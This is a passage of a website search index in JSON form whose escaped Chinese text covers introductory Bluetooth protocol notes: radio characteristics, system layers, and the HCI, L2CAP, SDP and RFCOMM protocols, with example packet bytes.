\u200b","title":"1.\u84dd\u7259\u7b80\u53f2"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#2","text":"\u5de5\u4f5c\u9891\u6bb5 \uff1a 2.4 GHz \u7684\u5de5\u79d1\u533b\uff08 ISM \uff09\u9891\u6bb5\uff0c\u65e0\u9700\u7533\u8bf7\u8bb8\u53ef\u8bc1\u3002\u5927\u591a\u6570\u56fd\u5bb6\u4f7f\u752879\u4e2a\u9891\u70b9\uff0c\u8f7d\u9891\u4e3a (2402+k)MHz\uff08k=0\uff0c1, 2\u202678\uff09 \uff0c\u8f7d\u9891\u95f4\u9694 1 MHz \u3002\u91c7\u7528 TDD \u65f6\u5206\u53cc\u5de5\u65b9\u5f0f\u3002 \u4f20\u8f93\u901f\u7387 \uff1a 1 Mb/s \u91c7\u7528\u8df3\u9891\u6280\u672f \uff1a\u8df3\u9891\u901f\u7387\u4e3a 1600 \u8df3/\u79d2\uff0c\u5728\u5efa\u94fe\u65f6\uff08\u5305\u62ec\u5bfb\u547c\u548c\u67e5\u8be2\uff09\u63d0\u9ad8\u4e3a 3200 \u8df3/\u79d2\u3002\u84dd\u7259\u901a\u8fc7\u5feb\u8df3\u9891\u548c\u77ed\u5206\u7ec4\u6280\u672f\u51cf\u5c11\u540c\u9891\u5e72\u6270\uff0c\u4fdd\u8bc1\u4f20\u8f93\u7684\u53ef\u9760\u6027\u3002 \u652f\u6301\u7535\u8def\u4ea4\u6362\u548c\u5206\u7ec4\u4ea4\u6362\u4e1a\u52a1 \uff1a\u84dd\u7259\u652f\u6301\u5b9e\u65f6\u7684\u540c\u6b65\u5b9a\u5411\u8054\u63a5\uff08 SCO \u94fe\u8def\uff09\u548c\u975e\u5b9e\u65f6\u7684\u5f02\u6b65\u4e0d\u5b9a\u5411\u8054\u63a5\uff08 ACL \u94fe\u8def\uff09\uff0c \u524d\u8005\u4e3b\u8981\u4f20\u9001\u8bed\u97f3\u7b49\u5b9e\u65f6\u6027\u5f3a\u7684\u4fe1\u606f\uff0c\u540e\u8005\u4ee5\u6570\u636e\u5305\u4e3a\u4e3b\u3002 \u8bed\u97f3\u548c\u6570\u636e\u53ef\u4ee5\u5355\u72ec\u6216\u540c\u65f6\u4f20\u8f93\u3002\u84dd\u7259\u652f\u6301\u4e00\u4e2a\u5f02\u6b65\u6570\u636e\u901a\u9053\uff0c\u6216\u4e09\u4e2a\u5e76\u53d1\u7684\u540c\u6b65\u8bdd\u97f3\u901a\u9053\uff0c\u6216\u540c\u65f6\u4f20\u9001\u5f02\u6b65\u6570\u636e\u548c\u540c\u6b65\u8bdd\u97f3\u7684\u901a\u9053\u3002\u6bcf\u4e2a\u8bdd\u97f3\u901a\u9053\u652f\u6301 64 kbps \u7684\u540c\u6b65\u8bdd\u97f3\uff1b\u5f02\u6b65\u901a\u9053\u652f\u6301 723.2/57.6 kbps \u7684\u975e\u5bf9\u79f0\u53cc\u5de5\u901a\u4fe1\u6216 433.9 kbps \u7684\u5bf9\u79f0\u5168\u53cc\u5de5\u901a\u4fe1\u3002 \u652f\u6301\u70b9\u5bf9\u70b9\u53ca\u70b9\u5bf9\u591a\u70b9\u901a\u4fe1 \uff1a\u84dd\u7259\u8bbe\u5907\u6309\u7279\u5b9a\u65b9\u5f0f\u53ef\u7ec4\u6210\u4e24\u79cd\u7f51\u7edc\uff1a\u5fae\u5fae\u7f51( Piconet )\u548c\u5206\u5e03\u5f0f\u7f51\u7edc( Scatternet )\uff0c\u5176\u4e2d\u5fae\u5fae\u7f51\u7684\u5efa\u7acb\u7531\u4e24\u53f0\u8bbe\u5907\u7684\u8fde\u63a5\u5f00\u59cb\uff0c\u6700\u591a\u53ef\u7531\u516b\u53f0\u8bbe\u5907\u7ec4\u6210\u3002\u5728\u4e00\u4e2a\u5fae\u5fae\u7f51\u4e2d\uff0c\u53ea\u6709\u4e00\u53f0\u4e3a\u4e3b\u8bbe\u5907\uff08 Master \uff09\uff0c\u5176\u5b83\u5747\u4e3a\u4ece\u8bbe\u5907\uff08 Slave \uff09\uff0c\u4e0d\u540c\u7684\u4e3b\u4ece\u8bbe\u5907\u5bf9\u53ef\u4ee5\u91c7\u7528\u4e0d\u540c\u7684\u94fe\u63a5\u65b9\u5f0f\uff0c\u5728\u4e00\u6b21\u901a\u4fe1\u4e2d\uff0c\u94fe\u63a5\u65b9\u5f0f\u4e5f\u53ef\u4ee5\u4efb\u610f\u6539\u53d8\u3002\u51e0\u4e2a\u76f8\u4e92\u72ec\u7acb\u7684\u5fae\u5fae\u7f51\u4ee5\u7279\u5b9a\u65b9\u5f0f\u94fe\u63a5\u5728\u4e00\u8d77\u4fbf\u6784\u6210\u4e86\u5206\u5e03\u5f0f\u7f51\u7edc\u3002\u6240\u6709\u7684\u84dd\u7259\u8bbe\u5907\u90fd\u662f\u5bf9\u7b49\u7684\uff0c\u6240\u4ee5\u5728\u84dd\u7259\u4e2d\u6ca1\u6709\u57fa\u7ad9\u7684\u6982\u5ff5\u3002 \u5de5\u4f5c\u8ddd\u79bb \uff1a\u84dd\u7259\u8bbe\u5907\u5206\u4e3a\u4e09\u4e2a\u529f\u7387\u7b49\u7ea7\uff0c\u5206\u522b\u662f\uff1a 100 mW \uff08 20 dBm \uff09\u3001 2.5 mW \uff08 4 dBm \uff09\u548c 1 mW \uff08 0 dBm \uff09\uff0c\u76f8\u5e94\u7684\u6709\u6548\u5de5\u4f5c\u8303\u56f4\u4e3a\uff1a 100 \u7c73\u3001 10 \u7c73\u548c 1 \u7c73\u3002","title":"2.\u84dd\u7259\u6280\u672f\u7279\u6027"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#3","text":"\u84dd\u7259\u7cfb\u7edf\u7531\u4ee5\u4e0b\u51e0\u90e8\u5206\u7ec4\u6210\uff1a \u4f20\u8f93\u5c42\uff08\u5e95\u5c42\u786c\u4ef6\u6a21\u5757\uff09 \u4e2d\u4ecb\u5c42\uff08\u4e2d\u95f4\u534f\u8bae\u5c42\uff09 \u5e94\u7528\u5c42 \u5176\u4e2d\uff0c\u5e95\u5c42\u786c\u4ef6\u6a21\u5757\u5305\u62ec\u4ee5\u4e0b\u90e8\u5206\uff1a \u5c04\u9891\u5c42\uff1a\u8d1f\u8d23\u6570\u636e\u548c\u8bed\u97f3\u7684\u53d1\u9001\u548c\u63a5\u6536\uff0c\u7279\u70b9\u662f\u77ed\u8ddd\u79bb\u3001\u4f4e\u529f\u8017\u3002\u84dd\u7259\u5929\u7ebf\u4e00\u822c\u4f53\u79ef\u5c0f\u3001\u91cd\u91cf\u8f7b\uff0c\u5c5e\u4e8e\u5fae\u5e26\u5929\u7ebf\u3002 \u57fa\u5e26\u5c42\uff1a\u8fdb\u884c\u5c04\u9891\u4fe1\u53f7\u4e0e\u6570\u5b57\u6216\u8bed\u97f3\u4fe1\u53f7\u7684\u76f8\u4e92\u8f6c\u5316\uff0c\u5b9e\u73b0\u57fa\u5e26\u534f\u8bae\u548c\u5176\u5b83\u7684\u5e95\u5c42\u8fde\u63a5\u89c4\u7a0b\u3002 \u94fe\u8def\u7ba1\u7406\u5c42\uff1a\u8d1f\u8d23\u7ba1\u7406\u84dd\u7259\u8bbe\u5907\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u5b9e\u73b0\u94fe\u8def\u7684\u5efa\u7acb\u3001\u9a8c\u8bc1\u3001\u94fe\u8def\u914d\u7f6e\u7b49\u64cd\u4f5c\u3002","title":"3.\u84dd\u7259\u7cfb\u7edf\u7ec4\u6210"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#4","text":"\u4f20\u8f93\u5c42\u3001\u4e2d\u4ecb\u5c42\u3001\u5e94\u7528\u5c42\u62e5\u6709\u7740\u5404\u81ea\u7684\u534f\u8bae\u3002","title":"4.\u84dd\u7259\u534f\u8bae\u89c4\u8303"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#41","text":"\u4f20\u8f93\u534f\u8bae\u8d1f\u8d23\u84dd\u7259\u8bbe\u5907\u95f4\uff0c\u4e92\u76f8\u786e\u8ba4\u5bf9\u65b9\u7684\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u5efa\u7acb\u548c\u7ba1\u7406\u84dd\u7259\u8bbe\u5907\u95f4\u7684\u7269\u7406\u94fe\u8def\uff1b \u5e95\u5c42\u4f20\u8f93\u534f\u8bae \uff1a\u84dd\u7259\u5c04\u9891\uff08 Radio \uff09\u90e8\u5206\u3001\u57fa\u5e26\u94fe\u8def\u7ba1\u7406\u63a7\u5236\u5668\uff08 Baseband & Link Controller \uff09\u3001\u94fe\u8def\u7ba1\u7406\u534f\u8bae\uff08 Link ManagerProtocol \uff09 LMP \u3002\u8d1f\u8d23\u8bed\u8a00\u3001\u6570\u636e\u65e0\u7ebf\u4f20\u8f93\u7684\u7269\u7406\u5b9e\u73b0\u4ee5\u53ca\u84dd\u7259\u8bbe\u5907\u95f4\u7684\u8054\u7f51\u7ec4\u7f51\u3002 \u9ad8\u5c42\u4f20\u8f93\u534f\u8bae \uff1a\u903b\u8f91\u94fe\u8def\u63a7\u5236\u4e0e\u9002\u914d\u5668\uff08 LogicalLink Control and Adaptation Protocol \uff09 L2CAP \u3001\u4e3b\u673a\u63a7\u5236\u63a5\u53e3\uff08 HostControl Interface \uff0c HCI \uff09\u3002\u4e3a\u9ad8\u5c42\u5e94\u7528\u5c4f\u853d\u4e86\u8df3\u9891\u5e8f\u5217\u9009\u62e9\u7b49\u5e95\u5c42\u4f20\u8f93\u64cd\u4f5c\uff0c\u4e3a\u9ad8\u5c42\u7a0b\u5e8f\u63d0\u4f9b\u6709\u6548\u3001\u6709\u5229\u4e8e\u5b9e\u73b0\u6570\u636e\u5206\u7ec4\u683c\u5f0f\u3002","title":"4.1.\u4f20\u8f93\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#42","text":"\u4e2d\u4ecb\u534f\u8bae\u4e3a\u9ad8\u5c42\u5e94\u7528\u534f\u8bae\u6216\u8005\u7a0b\u5e8f\uff0c\u5728\u84dd\u7259\u903b\u8f91\u94fe\u8def\u4e0a\u5de5\u4f5c\u63d0\u4f9b\u5fc5\u8981\u7684\u652f\u6301\uff0c\u4e3a\u5e94\u7528\u63d0\u4f9b\u4e0d\u540c\u6807\u51c6\u63a5\u53e3\uff0c\u5305\u62ec\uff1a \u4e32\u53e3\u4eff\u771f\u534f\u8bae\uff1a RFCOMM \u670d\u52a1\u53d1\u73b0\u534f\u8bae\uff1a SDP \u4e92\u64cd\u4f5c\u534f\u8bae\uff1a IrDA \u7f51\u7edc\u8bbf\u95ee\u534f\u8bae\uff1a PPP\u3001IP\u3001TCP\u3001UDP \u7535\u8bdd\u63a7\u5236\u534f\u8bae\uff1a TCS \u3001 AT \u6307\u4ee4\u96c6","title":"4.2.\u4e2d\u4ecb\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#43","text":"\u84dd\u7259\u534f\u8bae\u6808\u4e4b\u4e0a\u7684\u5e94\u7528\u8f6f\u4ef6\u548c\u6240\u6d89\u53ca\u5230\u7684\u534f\u8bae\uff0c\u5982\uff1a\u62e8\u53f7\u4e0a\u7f51\u3001\u8bed\u8a00\u529f\u80fd\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5305\u62ec\uff1a \u901a\u7528\u5e94\u7528\u7c7b\u6846\u67b6\uff1a\u67e5\u8be2\u3001\u5efa\u7acb\u8fde\u63a5\u670d\u52a1\u7b49 \u84dd\u7259\u7535\u8bdd\u5e94\u7528\u7c7b\u6846\u67b6\uff1a\u7535\u8bdd\u63a7\u5236\u3001\u8bed\u8a00 \u84dd\u7259\u8fde\u7f51\u5e94\u7528\u7c7b\u6846\u67b6\uff1a\u7f51\u7edc\u5e94\u7528\u76f8\u5173 \u5bf9\u8c61\u4ea4\u4e92\u670d\u52a1\u7c7b\u6846\u67b6\uff1a IrDA\u3001OBEX \u84dd\u7259\u97f3\u89c6\u9891\u63a7\u5236\u7c7b\u6846\u67b6","title":"4.3.\u5e94\u7528\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/#5","text":"\u84dd\u7259\u7b80\u4ecb BlueTooth: \u84dd\u7259\u6280\u672f\u53ca\u5176\u7cfb\u7edf\u539f\u7406 \u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u4e00\uff09:\u84dd\u7259\u6982\u8ff0 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/06/24/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e00\uff09\u7b80\u4ecb/","title":"5.\u53c2\u8003\u94fe\u63a5"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/","text":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e09\uff09\u4e2d\u4ecb\u5c42\u534f\u8bae 1.\u4e3b\u673a\u63a7\u5236\u63a5\u53e3\u534f\u8bae HCI \u5e38\u7528\u84dd\u7259\u63a7\u5236\u5668\u63a5\u53e3\u6570\u636e\u5206\u7ec4\u5206\u4e3a\u4e09\u7c7b\uff0c\u5206\u522b\u4e3a\uff1a \u6307\u4ee4\u5206\u7ec4\uff080x01\uff09 \u4e8b\u4ef6\u5206\u7ec4\uff080x04\uff09 \u6570\u636e\u5206\u7ec4\uff08ACL\uff1a0x02\uff0cSCO\uff1a0x03\uff09 \u5168\u90e8\u5206\u7ec4\u7c7b\u578b\u5217\u4e3e\u5982\u4e0b\uff1a HCI \u5206\u7ec4\u7c7b\u578b RS232\u5206\u7ec4\u6307\u793a\u5668 HCI\u6307\u4ee4\u5206\u7ec4 0x01 HCI ACL\u6570\u636e\u5206\u7ec4 0x02 HCI SCO\u6570\u636e\u5206\u7ec4 0x03 HCI\u4e8b\u4ef6\u5206\u7ec4 0x04 HCI\u9519\u8bef\u6d88\u606f\u5206\u7ec4 0x05 HCI\u534f\u5546\u5206\u7ec4 0x06 1.1.\u6307\u4ee4\u5206\u7ec4 \u5982\uff1a Accpet Connection Request Opcode \u4e3a\uff1a 0x0409 \u53c2\u6570\u957f\u5ea6\u4e3a: 07 \u53c2\u6570\u4e2d\u84dd\u7259\u5730\u5740\u4e3a\uff1a 00:0d:fd:5f:16:9f \u89d2\u8272\u4e3a\uff1a\u4ece\u8bbe\u5907 0x01 \u5219\u5927\u7aef\u6570\u636e\u6a21\u5f0f\u6307\u4ee4\u4e3a\uff1a 09 04 07 9f 16 5f fd 0d 00 01 1.2.\u4e8b\u4ef6\u5206\u7ec4 \u5982\uff1a Accpet Connection Request Opcode :0x0409 \u72b6\u6001\uff1a 0x00 \u603b\u957f\u5ea6\uff1a 4 \u5b57\u8282 \u547d\u4ee4\u72b6\u6001\uff1a 0x0f \u5219\u5206\u7ec4\u4e3a\uff1a 04 0f 04 00 01 09 04 1.3.\u6570\u636e\u5206\u7ec4 ACL \u6570\u636e\u5206\u7ec4\uff08\u6ce8\uff1a PB = Packet_Boundary \uff1b BC = Broadcast Flag \uff09 SCO \u6570\u636e\u5206\u7ec4 2.\u903b\u8f91\u94fe\u8def\u63a7\u5236\u4e0e\u9002\u914d\u534f\u8bae L2CAP L2CAP \u4f4d\u4e8e\u57fa\u5e26\u4e4b\u4e0a\uff0c\u5c06\u57fa\u5e26\u7684\u6570\u636e\u5206\u7ec4\u8f6c\u6362\u4e3a\u4fbf\u4e8e\u9ad8\u5c42\u5e94\u7528\u7684\u6570\u636e\u5206\u7ec4\u683c\u5f0f\uff0c\u5e76\u63d0\u4f9b\u534f\u8bae\u590d\u7528\u548c\u670d\u52a1\u8d28\u91cf\u4ea4\u6362\u7b49\u529f\u80fd\u3002 L2CAP \u53ea\u652f\u6301 ACL \u6570\u636e\u4f20\u8f93\uff0c\u4e0d\u652f\u6301 SCO \u6570\u636e\u3002 L2CAP \u672c\u8eab\u4e0d\u63d0\u4f9b\u52a0\u5f3a\u4fe1\u9053\u53ef\u9760\u6027\u548c\u4fdd\u8bc1\u6570\u636e\u5b8c\u6574\u6027\u7684\u673a\u5236\uff0c\u5176\u4fe1\u9053\u7684\u53ef\u9760\u6027\u4f9d\u9760\u57fa\u5e26\u63d0\u4f9b\u3002 L2CAP \u4e3b\u8981\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a \u534f\u8bae\u590d\u7528 \uff1a\u5e95\u5c42\u4f20\u8f93\u534f\u8bae\u6ca1\u6709\u63d0\u4f9b\u5bf9\u9ad8\u5c42\u534f\u8bae\u7684\u590d\u7528\u673a\u5236\uff0c\u56e0\u800c L2CAP \u652f\u6301\u9ad8\u5c42\u534f\u8bae\u590d\u7528\uff0cL2CAP \u5c42\u53ef\u4ee5\u533a\u5206\u5176\u4e0a\u7684 SDP\u3001RFCOMM\u3001TCS \u7b49\u3002 \u5206\u6bb5\u91cd\u7ec4 \uff1aL2CAP\u5c42\u5e2e\u52a9\u5b9e\u73b0\u57fa\u5e26\u7684\u77ed PDU \u548c\u9ad8\u5c42\u7684\u957f PDU \u76f8\u4e92\u4f20\u8f93\uff0cL2CAP \u672c\u8eab\u4e0d\u5b8c\u6210\u4efb\u4f55 PDU \u7684\u5206\u6bb5\u91cd\u7ec4\uff0c\u5177\u4f53\u7684\u5206\u6bb5\u91cd\u7ec4\u6709\u4f4e\u5c42\u548c\u9ad8\u5c42\u6765\u5b8c\u6210\u3002 \u670d\u52a1\u8d28\u91cf Qualityof Serivce \u4fe1\u606f\u7684\u4ea4\u6362 \uff1a\u84dd\u7259\u5efa\u7acb\u8fde\u63a5\u7684\u8fc7\u7a0b\u4e2d\uff0cL2CAP\u5141\u8bb8\u4ea4\u4e92\u84dd\u7259\u6240\u671f\u671b\u7684\u670d\u52a1\u8d28\u91cf\uff0c\u5efa\u7acb\u5b8c\u6210\u540e\uff0c\u901a\u8fc7\u76d1\u89c6\u8d44\u6e90\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u6765\u4fdd\u8bc1\u670d\u52a1\u8d28\u91cf\u3002 \u7ec4\u62bd\u8c61 \uff1a L2CAP \u5ffd\u7565\u5730\u5740\u7ec4\u6982\u5ff5\uff0c\u4ed6\u53ea\u5173\u5fc3\u6570\u636e\u3002 L2CAP \u4fe1\u9053\u6709\u4e09\u79cd\u7c7b\u578b\uff1a \u9762\u5411\u8fde\u63a5\u4fe1\u9053\uff1a Connection-Oriented CO \uff0c\u7528\u4e8e\u4e24\u4e2a\u8bbe\u5907\u4e4b\u95f4\u7684\u6570\u636e\u901a\u4fe1\u3002 \u65e0\u8fde\u63a5\u4fe1\u9053\uff1a Connection-LessCL \uff0c\u7528\u6765\u5411\u4e00\u7ec4\u8bbe\u5907\u5e7f\u64ad\u65b9\u5f0f\u4f20\u8f93\u6570\u636e\u3002 CID \u4e3a\u56fa\u5b9a\u503c\uff1a 0x0002\u3002 \u4fe1\u4ee4\u4fe1\u9053\uff1a Signaling \uff0c\u7528\u4e8e\u521b\u5efa CO \u901a\u9053\uff0c\u53ef\u4ee5\u901a\u8fc7\u534f\u5546\u6539\u53d8 CO \u4fe1\u9053\u7684\u7279\u6027\u3002 \u534f\u8bae\u6570\u636e\u5355\u5143\uff1a 3.\u670d\u52a1\u53d1\u73b0\u534f\u8bae SDP SDP\u4e24\u79cd\u670d\u52a1\u53d1\u73b0\u6a21\u5f0f\uff1a \u670d\u52a1\u641c\u7d22\uff1a\u67e5\u8be2\u5177\u6709\u7279\u5b9a\u670d\u52a1\u5c5e\u6027\u7684\u670d\u52a1\uff1b \u670d\u52a1\u6d4f\u89c8\uff1a\u7b80\u5355\u7684\u6d4f\u89c8\u5168\u90e8\u53ef\u7528\u670d\u52a1\u3002 \u5176 PDU \uff08\u534f\u8bae\u6570\u636e\u5355\u5143\uff09\u683c\u5f0f\u4e3a\uff1a \u4e0d\u540c\u7684 PDU ID \u7684\u610f\u4e49\u4e3a\uff1a Value Parameter Descirption 0x00 Reserved \u4fdd\u7559 0x01 SDP_ErrorResponse \u9519\u8bef\u54cd\u5e94 0x02 SDP_ServiceSearchRequest \u670d\u52a1\u641c\u7d22\u8bf7\u6c42 0x03 SDP_ServiceSearchResponse \u670d\u52a1\u641c\u7d22\u54cd\u5e94 0x04 SDP_ServiceAttributeRequest \u670d\u52a1\u5c5e\u6027\u8bf7\u6c42 0x05 SDP_ServiceAttributeResponse \u670d\u52a1\u5c5e\u6027\u54cd\u5e94 0x06 SDP_ServiceSearchAttributeRequest \u670d\u52a1\u641c\u7d22\u5c5e\u6027\u8bf7\u6c42 0x07 SDP_ServiceSearchAttributeResponse \u670d\u52a1\u641c\u7d22\u5c5e\u6027\u54cd\u5e94 0x08-0xff Reserved \u4fdd\u7559 4.\u4e32\u53e3\u4eff\u771f\u534f\u8bae RFCOMM RFCOMM \u662f\u4e3a\u5efa\u7acb\u5728\u4e32\u53e3\u4e4b\u4e0a\u7684\u4f20\u7edf\u5e94\u7528\u63d0\u4f9b\u73af\u5883\u63a5\u53e3\uff0c\u4f7f\u4ed6\u4eec\u53ef\u4ee5\u505a\u6bd4\u8f83\u5c11\u534f\u8bae\u6539\u52a8\u5c31\u53ef\u4ee5\u5728\u84dd\u7259\u65e0\u7ebf\u901a\u4fe1\u65e0\u7ebf\u94fe\u8def\u4e0a\u5de5\u4f5c\u3002\u591a\u8def\u4e32\u53e3\u4eff\u771f\u662f RFCOMM \u7684\u91cd\u8981\u529f\u80fd\uff0c\u901a\u8fc7\u591a\u8def\u590d\u7528\u5668( multiplexer )\uff0c\u4e00\u6761 L2CAP \u94fe\u8def\u53ef\u4ee5\u540c\u65f6 \u591a\u4e2a\u4e32\u884c\u5e94\u7528\u3002 RFCOMM \u4e24\u4e2a\u84dd\u7259\u8bbe\u5907\u4e4b\u95f4\u53ef\u4ee5\u652f\u6301\u591a\u8fbe60\u591a\u8def\u4eff\u771f\u4e32\u53e3\u3002 RFCOMM \u5e27\u7c7b\u578b\u5982\u4e0b\uff1a SABM \u5f02\u6b65\u5e73\u8861\u6a21\u5f0f\u8bbe\u7f6e\u6307\u4ee4 UA \u672a\u52a0\u7f16\u53f7\u7684\u786e\u8ba4\u54cd\u5e94 DM \u65ad\u5f00\u8fde\u63a5\u6a21\u5f0f\u54cd\u5e94 DISC \u65ad\u5f00\u8fde\u63a5\u6307\u4ee4 UIH \u5e26\u5934\u6821\u9a8c\u7684\u672a\u7f16\u53f7\u4fe1\u606f\u547d\u4ee4\u548c\u54cd\u5e94 X.\u53c2\u8003\u8fde\u63a5 \u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u56db\uff09\uff1a\u84dd\u7259\u534f\u8bae\u89c4\u8303\uff08HCI\u3001L2CAP\u3001SDP\u3001RFOCMM\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/07/06/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e09\uff09\u4e2d\u4ecb\u5c42\u534f\u8bae/","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e09\uff09\u4e2d\u4ecb\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#_1","text":"","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e09\uff09\u4e2d\u4ecb\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#1-hci","text":"\u5e38\u7528\u84dd\u7259\u63a7\u5236\u5668\u63a5\u53e3\u6570\u636e\u5206\u7ec4\u5206\u4e3a\u4e09\u7c7b\uff0c\u5206\u522b\u4e3a\uff1a \u6307\u4ee4\u5206\u7ec4\uff080x01\uff09 \u4e8b\u4ef6\u5206\u7ec4\uff080x04\uff09 \u6570\u636e\u5206\u7ec4\uff08ACL\uff1a0x02\uff0cSCO\uff1a0x03\uff09 \u5168\u90e8\u5206\u7ec4\u7c7b\u578b\u5217\u4e3e\u5982\u4e0b\uff1a HCI \u5206\u7ec4\u7c7b\u578b RS232\u5206\u7ec4\u6307\u793a\u5668 HCI\u6307\u4ee4\u5206\u7ec4 0x01 HCI ACL\u6570\u636e\u5206\u7ec4 0x02 HCI SCO\u6570\u636e\u5206\u7ec4 0x03 HCI\u4e8b\u4ef6\u5206\u7ec4 0x04 HCI\u9519\u8bef\u6d88\u606f\u5206\u7ec4 0x05 HCI\u534f\u5546\u5206\u7ec4 0x06","title":"1.\u4e3b\u673a\u63a7\u5236\u63a5\u53e3\u534f\u8bae HCI"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#11","text":"\u5982\uff1a Accpet Connection Request Opcode \u4e3a\uff1a 0x0409 \u53c2\u6570\u957f\u5ea6\u4e3a: 07 \u53c2\u6570\u4e2d\u84dd\u7259\u5730\u5740\u4e3a\uff1a 00:0d:fd:5f:16:9f \u89d2\u8272\u4e3a\uff1a\u4ece\u8bbe\u5907 0x01 \u5219\u5927\u7aef\u6570\u636e\u6a21\u5f0f\u6307\u4ee4\u4e3a\uff1a 09 04 07 9f 16 5f fd 0d 00 01","title":"1.1.\u6307\u4ee4\u5206\u7ec4"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#12","text":"\u5982\uff1a Accpet Connection Request Opcode :0x0409 \u72b6\u6001\uff1a 0x00 \u603b\u957f\u5ea6\uff1a 4 \u5b57\u8282 \u547d\u4ee4\u72b6\u6001\uff1a 0x0f \u5219\u5206\u7ec4\u4e3a\uff1a 04 0f 04 00 01 09 04","title":"1.2.\u4e8b\u4ef6\u5206\u7ec4"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#13","text":"ACL \u6570\u636e\u5206\u7ec4\uff08\u6ce8\uff1a PB = Packet_Boundary \uff1b BC = Broadcast Flag \uff09 SCO \u6570\u636e\u5206\u7ec4","title":"1.3.\u6570\u636e\u5206\u7ec4"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#2-l2cap","text":"L2CAP \u4f4d\u4e8e\u57fa\u5e26\u4e4b\u4e0a\uff0c\u5c06\u57fa\u5e26\u7684\u6570\u636e\u5206\u7ec4\u8f6c\u6362\u4e3a\u4fbf\u4e8e\u9ad8\u5c42\u5e94\u7528\u7684\u6570\u636e\u5206\u7ec4\u683c\u5f0f\uff0c\u5e76\u63d0\u4f9b\u534f\u8bae\u590d\u7528\u548c\u670d\u52a1\u8d28\u91cf\u4ea4\u6362\u7b49\u529f\u80fd\u3002 L2CAP \u53ea\u652f\u6301 ACL \u6570\u636e\u4f20\u8f93\uff0c\u4e0d\u652f\u6301 SCO \u6570\u636e\u3002 L2CAP \u672c\u8eab\u4e0d\u63d0\u4f9b\u52a0\u5f3a\u4fe1\u9053\u53ef\u9760\u6027\u548c\u4fdd\u8bc1\u6570\u636e\u5b8c\u6574\u6027\u7684\u673a\u5236\uff0c\u5176\u4fe1\u9053\u7684\u53ef\u9760\u6027\u4f9d\u9760\u57fa\u5e26\u63d0\u4f9b\u3002 L2CAP \u4e3b\u8981\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a \u534f\u8bae\u590d\u7528 \uff1a\u5e95\u5c42\u4f20\u8f93\u534f\u8bae\u6ca1\u6709\u63d0\u4f9b\u5bf9\u9ad8\u5c42\u534f\u8bae\u7684\u590d\u7528\u673a\u5236\uff0c\u56e0\u800c L2CAP \u652f\u6301\u9ad8\u5c42\u534f\u8bae\u590d\u7528\uff0cL2CAP \u5c42\u53ef\u4ee5\u533a\u5206\u5176\u4e0a\u7684 